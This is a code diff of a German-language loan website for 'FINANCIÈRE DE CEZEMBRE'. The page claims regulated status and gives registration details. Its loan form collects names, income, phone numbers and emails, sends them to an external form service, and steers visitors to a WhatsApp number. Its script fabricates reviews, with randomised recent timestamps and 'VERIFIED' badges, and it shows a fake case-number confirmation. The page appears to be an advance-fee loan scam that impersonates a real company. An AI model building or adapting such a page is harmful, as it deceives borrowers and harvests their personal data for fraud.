@@ -22,19 +22,9 @@
             --success: #27ae60;
         }
 
-        .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
-        body { top: 0px !important; }
-        .goog-te-gadget-simple { background-color: transparent !important; border: none !important; }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         
-        body { 
-            background-color: var(--white); 
-            color: #333; 
-            overflow-x: hidden; 
-            top: 0 !important; 
-            position: static !important; 
-        }
+        body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
         header {
             background: var(--white); padding: 20px 8%; display: flex;
@@ -53,7 +43,7 @@
         
         .nav-links { display: flex; gap: 30px; align-items: center; }
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; transition: 0.3s; cursor: pointer; }
-        .nav-links a:hover { color: var(--gold); text-shadow: 0 0 8px rgba(197, 160, 89, 0.4); }
+        .nav-links a:hover { color: var(--gold); }
 
         .intl-badge {
             font-size: 0.7rem; font-weight: 700; color: var(--gold); 
@@ -68,14 +58,7 @@
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
 
-        .hero-content { 
-            max-width: 600px; 
-            position: relative;
-            z-index: 1;
-            padding: 20px;
-            background: radial-gradient(circle at center, rgba(197, 160, 89, 0.2) 0%, transparent 70%);
-            border-radius: 50%;
-        }
+        .hero-content { max-width: 600px; z-index: 1; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
         .simulator { 
@@ -86,136 +69,64 @@
 
         @media (max-width: 991px) {
             .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
-            .hero-content { max-width: 100%; margin-bottom: 40px; }
-            .hero-content h1 { font-size: 2.2rem; }
-            .simulator { width: 100%; max-width: 480px; padding: 25px; }
+            .simulator { width: 100%; max-width: 480px; }
             .stats-bar { flex-direction: column; gap: 30px; }
-            .f-grid, .legal-block { margin-left: 0 !important; text-align: center; }
+            .f-grid, .legal-block { margin-left: 0 !important; }
             .f-grid { grid-template-columns: 1fr; }
-            .reviews-grid { grid-template-columns: 1fr !important; padding: 20px !important; }
-            footer { padding-bottom: 160px !important; } 
-            .wa-assistant-container { bottom: 15px; left: 15px; }
-            .wa-msg-bubble { font-size: 0.6rem; padding: 5px 10px; margin-bottom: 10px; }
-            .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
         }
 
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
-        .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
-        
-        .trust-badge-container {
-            display: inline-flex; align-items: center; justify-content: center;
-            background: white; padding: 12px 30px; border-radius: 50px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid rgba(197, 160, 89, 0.3);
-            margin-bottom: 40px;
-        }
-        .trust-stars { color: var(--bright-gold); font-size: 1.1rem; letter-spacing: 3px; }
-        .trust-lock { 
-            color: var(--gold); font-size: 1.6rem; margin: 0 20px;
-            animation: pulse-lock 3s infinite ease-in-out; 
-        }
-        @keyframes pulse-lock {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.15); opacity: 0.8; }
-        }
+        .trust-badge-container { display: inline-flex; align-items: center; margin-bottom: 40px; }
+        .trust-stars { color: var(--bright-gold); font-size: 1.1rem; }
+        .trust-lock { color: var(--gold); font-size: 1.6rem; margin: 0 20px; animation: pulse-lock 3s infinite; }
+        @keyframes pulse-lock { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
 
         .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
-        
-        .review-card { 
-            background: white; padding: 25px; border-radius: 8px; 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; 
-            border-top: 3px solid var(--gold); transition: all 0.4s ease;
-        }
-        .review-card:hover { 
-            transform: translateY(-5px); box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2); 
-        }
-
-        .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
-        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
-        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px; }
-        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
-        .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; }
+        .review-card { background: white; padding: 25px; border-radius: 8px; text-align: left; border-top: 3px solid var(--gold); }
 
         .sim-row { margin-bottom: 20px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
-        .sim-row label span { color: var(--navy); font-weight: 800; } 
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; }
         
-        input[type="range"] { 
-            -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; outline: none;
-            background-image: linear-gradient(var(--bright-gold), var(--bright-gold));
-            background-repeat: no-repeat; background-size: 0% 100%;
-        }
-        input[type="range"]::-webkit-slider-thumb { 
-            -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; 
-            background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
-        }
-        input[type="range"]::-moz-range-thumb { 
-            height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; 
-        }
+        input[type="range"] { -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; background-image: linear-gradient(var(--bright-gold), var(--bright-gold)); background-repeat: no-repeat; }
+        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; }
         
-        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
-        .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; text-shadow: 1px 2px 3px rgba(0,0,0,0.1); animation: blink-soft 3s infinite; }
-        @keyframes blink-soft { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border-radius: 4px; margin-bottom: 20px; }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
-        .form-input { 
-            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); 
-            background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
-            font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
-        }
-        .form-input:focus { border-color: var(--navy); background-color: #fffef0; }
+        .btn-whatsapp-sim { background: var(--whatsapp); color: white; border: none; width: 100%; padding: 15px; font-weight: 700; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; animation: magnet-pulse 2s infinite ease-in-out; }
 
-        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
+        .form-input { width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); border-radius: 4px; margin-bottom: 10px; font-size: 1rem; font-weight: 600; }
 
-        .scrolling-security {
-            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
-            overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
-            display: flex;
-        }
-        .scrolling-security span {
-            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
-        }
+        .scrolling-security { background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0; overflow: hidden; white-space: nowrap; display: flex; }
+        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
 
-        .shine-white { color: #FFFFFF !important; animation: blink-white 3s infinite; }
-        @keyframes blink-white { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; text-shadow: 0 0 10px #fff; } }
-
-        #loader-overlay {
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
-        }
-        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        #loader-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #success-message { display: none; text-align: center; }
-        #success-message i { color: var(--success); font-size: 4rem; margin-bottom: 20px; }
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
 
-        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
-        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
-
+        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; }
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid, .legal-block { margin-left: 160px; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
-        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
-        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
-        .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
-        @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-left: 160px; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; margin-left: 160px; }
 
-        /* WHATSAPP DYNAMIQUE */
+        @keyframes magnet-pulse {
+            0% { transform: scale(1); }
+            10% { transform: scale(1.05) rotate(2deg); }
+            20% { transform: scale(1.05) rotate(-2deg); }
+            30% { transform: scale(1.05) rotate(2deg); }
+            40% { transform: scale(1) rotate(0deg); }
+            100% { transform: scale(1); }
+        }
+
         .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
-        .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
-        .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
-        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: magnet-pulse 2s infinite ease-in-out; }
-        
-        @keyframes magnet-pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 10% { transform: scale(1.1) rotate(5deg); } 20% { transform: scale(1.1) rotate(-5deg); } 30% { transform: scale(1.1) rotate(5deg); } 40% { transform: scale(1) rotate(0deg); } 70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
-        @keyframes fadeInOut { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(0.95); } }
-        
+        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; display: flex; align-items: center; justify-content: center; text-decoration: none; animation: magnet-pulse 2s infinite ease-in-out; }
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
@@ -227,31 +138,26 @@
         <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     </div>
     <div class="nav-links">
-        <a href="#about">Expertise</a>
-        <a href="#legal">Gouvernance</a>
+        <a href="#about">Unsere Expertise</a>
+        <a href="#legal">Governance</a>
         <a onclick="goToStep1()" href="#simBox">Kontakt</a>
-        <div id="google_translate_element" style="display:none;"></div>
-        <div class="intl-badge"><i class="fas fa-globe"></i> SICHERES INTERNATIONALES PORTAL</div>
+        <div class="intl-badge"><i class="fas fa-globe"></i> GESICHERTES INTERNATIONALES PORTAL</div>
     </div>
 </header>
 
 <div class="wa-assistant-container">
-    <div class="wa-msg-bubble"><span id="wa-text">Brauchen Sie Hilfe? Kontaktieren Sie uns</span></div>
-    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
+    <a href="https://wa.me/33780976404?text=Hallo,%20Name%20und%20Vorname%20:%20...%20Projekt%20:%20..." class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
 </div>
 
 <section class="hero">
     <div class="hero-content">
         <h1>Finanzielle Exzellenz <br>für Ihre Projekte.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.9;">Zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Ihr zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
         
         <div style="display: flex; gap: 20px; align-items: center;">
-            <div style="position: relative; display: flex; align-items: center; justify-content: center;">
-                <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
-                <i class="fas fa-check" style="color: var(--navy); position: absolute; font-size: 1.2rem; font-weight: 900;"></i>
-            </div>
+            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
             <p>
-                <strong style="color: #FFD700; font-size: 0.9rem; letter-spacing: 1px;">ZUGELASSENES INSTITUT</strong><br>
+                <strong style="color: #FFD700; font-size: 0.9rem;">ZUGELASSENES INSTITUT</strong><br>
                 <strong>Eingetragen unter RCS 552 058 943</strong><br>
                 Unter der Aufsicht der französischen Bankenbehörden.
             </p>
@@ -262,13 +168,13 @@
         <div id="loader-overlay">
             <div id="loading-content">
                 <div class="spinner"></div>
-                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse läuft...</p>
+                <p style="font-weight: 600; color: var(--navy);">Dossier-Analyse läuft...</p>
             </div>
-            <div id="success-message">
-                <i class="fas fa-check-circle"></i>
-                <h3 style="color: var(--navy); margin-bottom: 10px;">ANTRAG GESPEICHERT</h3>
-                <p style="font-size: 0.9rem; margin-bottom: 20px;">Ihre Fallnummer: <strong>#CEZ-2026</strong> wurde erfolgreich übermittelt.</p>
-                <button class="btn-main" onclick="resetAll()">OK</button>
+            <div id="success-message" style="display:none;">
+                <i class="fas fa-check-circle" style="color:var(--success); font-size:4rem;"></i>
+                <h3 style="color: var(--navy); margin-top:20px;">ANTRAG REGISTRIERT</h3>
+                <p>Ihre Dossiernummer: <strong>#CEZ-2026</strong> wurde erfolgreich übermittelt.</p>
+                <button class="btn-main" style="margin-top:20px;" onclick="resetAll()">OK</button>
             </div>
         </div>
 
@@ -287,11 +193,9 @@
                 <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
             </div>
             <button type="button" class="btn-main" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
+            <a href="https://wa.me/33780976404?text=Hallo,%20Name%20und%20Vorname%20:%20...%20Projekt%20:%20..." class="btn-whatsapp-sim" target="_blank"><i class="fab fa-whatsapp"></i> HILFE PER WHATSAPP</a>
             
-            <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> DATENSCHUTZ: Ihre Daten sind streng vertraulich. • 256-Bit-SSL-Verschlüsselung • Garantierter Schutz.</span>
-            </div>
-            <div class="security-tag"><i class="fas fa-lock"></i> IHR DOSSIER IST 100% SICHER</div>
+            <div class="security-tag" style="margin-top:15px; text-align:center; font-size:0.7rem; color:var(--success); font-weight:700;"><i class="fas fa-lock"></i> IHR DOSSIER IST ZU 100% GESICHERT</div>
         </div>
 
         <div id="step2" style="display:none;">
@@ -300,7 +204,7 @@
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
                 
-                <input type="text" name="nom" placeholder="Vor- und Nachname" class="form-input" required>
+                <input type="text" name="nom" placeholder="Name und Vorname" class="form-input" required>
                 
                 <select name="projet" class="form-input" required>
                     <option value="" disabled selected>Wählen Sie Ihr Projekt</option>
@@ -308,29 +212,29 @@
                     <option value="Personnel">Privatkredit</option>
                     <option value="Auto">Auto / Motorrad</option>
                     <option value="Travaux">Renovierung</option>
-                    <option value="Autre">Andere</option>
+                    <option value="Autre">Sonstiges</option>
                 </select>
 
+                <input type="number" name="revenu" placeholder="Monatliches Nettoeinkommen (in €)" class="form-input" required>
+
                 <select name="pays" class="form-input" required>
-                    <option value="Allemagne" selected>Deutschland (+49)</option>
+                    <option value="" disabled selected>Wohnsitzland</option>
+                    <option value="Allemagne">Deutschland (+49)</option>
                     <option value="France">Frankreich (+33)</option>
                     <option value="Belgique">Belgien (+32)</option>
                     <option value="Suisse">Schweiz (+41)</option>
                     <option value="Luxembourg">Luxemburg (+352)</option>
-                    <option value="Österreich">Österreich (+43)</option>
+                    <option value="Autriche">Österreich (+43)</option>
                     <option value="Italie">Italien (+39)</option>
+                    <option value="Espagne">Spanien (+34)</option>
                     <option value="Canada">Kanada (+1)</option>
                 </select>
 
-                <input type="tel" name="telephone" placeholder="Telefon (z.B. +49...)" class="form-input" required>
+                <input type="tel" name="telephone" value="+49" class="form-input" required>
                 <input type="email" name="email" placeholder="E-Mail-Adresse" class="form-input" required>
                 
-                <div class="scrolling-security">
-                    <span><i class="fas fa-lock" style="color:var(--gold);"></i> Hochsichere Übertragung. Ihre Daten sind geschützt.</span>
-                </div>
-
-                <button type="submit" class="btn-main">ABSENDEN BESTÄTIGEN</button>
-                <div class="security-tag"><i class="fas fa-lock"></i> 256-Bit-SSL-Verschlüsselung</div>
+                <button type="submit" class="btn-main">SENDEN BESTÄTIGEN</button>
+                <button type="button" style="background:none; border:none; color:grey; margin-top:10px; cursor:pointer;" onclick="goToStep1()">Zurück</button>
             </form>
         </div>
     </div>
@@ -338,12 +242,12 @@
 
 <section class="stats-bar">
     <div class="stat-box"><h3>1 200 000 €</h3><p>Grundkapital</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Vorzugszinssatz</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Vorzugszins</p></div>
     <div class="stat-box"><h3>100%</h3><p>Digital & Sicher</p></div>
 </section>
 
 <section class="reviews-section">
-    <h2>Vertrauen unserer internationalen Kunden</h2>
+    <h2>Das Vertrauen unserer internationalen Kunden</h2>
     <div class="trust-badge-container">
         <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
         <div class="trust-lock"><i class="fas fa-lock"></i></div>
@@ -354,29 +258,26 @@
 
 <section class="about-section" id="about">
     <h2>Eine Referenzinstitution</h2>
-    <p>FINANCIÈRE DE CEZEMBRE mit Sitz in Ergué-Gabéric (29500) ist eine führende Aktiengesellschaft im Bereich der Kreditvergabe (Code APE 64.92Z). Mit einem Grundkapital von 1.200.000 Euro gewährleistet unser Institut eine strenge Verwaltung von Beteiligungen und komplexen Finanzoperationen.</p>
+    <p>FINANCIÈRE DE CEZEMBRE mit Sitz in Ergué-Gabéric (29500) ist eine führende Aktiengesellschaft im Bereich der Kreditvermittlung (APE-Code 64.92Z). Mit einem Grundkapital von 1.200.000 Euro gewährleistet unser Institut ein strenges Management von Beteiligungen und komplexen Finanztransaktionen.</p>
+    <p>Unter der Leitung von Herrn Michel Pajot arbeiten wir mit bedeutenden Akteuren zusammen, um Stabilität und Fachwissen auf dem europäischen Markt zu garantieren.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>Regulierte Kreditverteilung.<br>LEI : 969500WONJGTDZG8E035</p></div>
+        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Regulierte Kreditvergabe.<br>LEI: 969500WONJGTDZG8E035</p></div>
         <div><h4>HAUPTSITZ</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, Frankreich</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
+        <div><h4>GOVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>PRÜFUNG</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
-        <strong>RECHTLICHE INFORMATIONEN :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Unterliegt der ACPR. 
-        <div class="tag-warning"><span class="blink-gold">EIN KREDIT VERPFLICHTET SIE UND MUSS ZURÜCKGEZAHLT WERDEN.</span></div>
+        <strong>RECHTLICHE HINWEISE:</strong> SIRET 552 058 943 00044. Unterliegt der ACPR. <br>
+        <span style="color:var(--gold); font-weight:700;">EIN KREDIT VERPFLICHTET SIE UND MUSS ZURÜCKGEZAHLT WERDEN.</span>
     </div>
 </footer>
 
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
-    const waText = document.getElementById('wa-text');
-    const messages = ["Brauchen Sie Hilfe?", "Need help?", "Kontaktieren Sie uns", "An agent is ready"];
-    let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
-
     const internationalReviews = [
         { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle. Projet réalisé en un temps record." },
         { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier. Top !" },
@@ -406,7 +307,7 @@
         { n: "Robert H.", p: "Allemagne", t: "Endlich eine Bank, die zuhört. Sehr zufrieden mit dem Kredit." },
         { n: "Julie M.", p: "Belgique", t: "Top service, j'ai eu les fonds sur mon compte en 48h." },
         { n: "Mathias P.", p: "Suisse", t: "Sérieux, rapide et efficace. Je recommande sans hésiter." },
-        { n: "Elena G.", p: "Roumanie", t: "Mulțumesc pour ajutor, proiectul meu est acum realitate." },
+        { n: "Elena G.", p: "Roumanie", t: "Mulțumesc pour ajutor, proiectul meu este acum realitate." },
         { n: "Besnik S.", p: "Kosovo", t: "Kredit i shpejtë dhe pa shumë burokraci. Shumë mirë." },
         { n: "Laurent G.", p: "Guadeloupe", t: "Un accompagnement humain malgré la distance. Merci." },
         { n: "Isabelle L.", p: "Canada", t: "Efficace et sécuritaire. J'ai obtenu mon prêt travaux rapidement." },
@@ -424,15 +325,14 @@
         const container = document.getElementById('reviews-container');
         container.innerHTML = ""; 
         internationalReviews.sort(() => 0.5 - Math.random()).slice(0, 12).forEach(r => {
+            const times = ["2 min", "15 min", "1h", "3h", "5h", "1j", "2j"];
+            const randomTime = times[Math.floor(Math.random() * times.length)];
             container.innerHTML += `
                 <div class="review-card">
-                    <span class="review-date"><i class="far fa-clock"></i> Vor kurzem</span>
+                    <span class="review-date"><i class="far fa-clock"></i> Il y a ${randomTime}</span>
                     <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                     <p class="review-text">"${r.t}"</p>
-                    <div class="review-author">
-                        <div>${r.n} (${r.p})</div>
-                        <span class="verified"><i class="fas fa-check-circle"></i> VERIFIZIERT</span>
-                    </div>
+                    <div class="review-author"><div>${r.n} (${r.p})</div><span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span></div>
                 </div>`;
         });
     }
@@ -452,10 +352,8 @@
         document.getElementById('hiddenAmt').value = p + " €";
         document.getElementById('hiddenDur').value = n + " Monate";
         document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
-        let valA = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100;
-        amtR.style.backgroundSize = valA + '% 100%';
-        let valD = (durR.value - durR.min) / (durR.max - durR.min) * 100;
-        durR.style.backgroundSize = valD + '% 100%';
+        amtR.style.backgroundSize = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100 + '% 100%';
+        durR.style.backgroundSize = (durR.value - durR.min) / (durR.max - durR.min) * 100 + '% 100%';
     }
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
@@ -466,21 +364,17 @@
     window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
-    const form = document.getElementById('loanForm');
-    form.onsubmit = async (e) => {
+    document.getElementById('loanForm').onsubmit = async (e) => {
         e.preventDefault();
-        const overlay = document.getElementById('loader-overlay');
-        overlay.style.display = 'flex';
-        const formData = new FormData(form);
+        document.getElementById('loader-overlay').style.display = 'flex';
         try {
-            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
             setTimeout(() => {
                 document.getElementById('loading-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
-            }, 4000);
-        } catch (error) { overlay.style.display = 'none'; alert("Error. Please try again."); }
+            }, 3000);
+        } catch (error) { alert("Fehler. Bitte versuchen Sie es erneut."); }
     };
 </script>
-
 </body>
 </html>
